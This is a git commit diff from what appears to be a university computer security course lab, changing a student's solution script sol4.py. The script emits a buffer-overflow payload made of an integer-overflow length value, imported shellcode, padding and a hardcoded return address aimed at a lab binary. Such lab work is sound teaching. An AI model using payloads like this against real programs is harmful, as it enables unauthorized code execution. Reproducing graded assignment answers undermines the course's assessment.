773f9a640982c5309d3828ca7f9989262f3e20c4
eecs388 <adwisi@umich.edu>
2024-11-15 19:40:57 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol4.py
+++ sol4.py
@@ -4,10 +4,12 @@ import sys
 
 from shellcode import shellcode
 
-sys.stdout.buffer.write(0x8000000000000001.to_bytes(8, 'little'))
+#sys.stdout.buffer.write(0x8fffffffffffffff.to_bytes(8, 'little'))
 
-sys.stdout.buffer.write(shellcode)
-
-sys.stdout.buffer.write(b'\xff'*18)
+#sys.stdout.buffer.write(shellcode)
+'''
+sys.stdout.buffer.write('S'*18)
 
 sys.stdout.buffer.write(0x7ffffff6cda0.to_bytes(8, 'little'))
+'''
+sys.stdout.buffer.write(0x8000000000000001.to_bytes(8, 'little') + shellcode + b'\x00'*18 + 0x7ffffff68f90.to_bytes(8, 'little'))
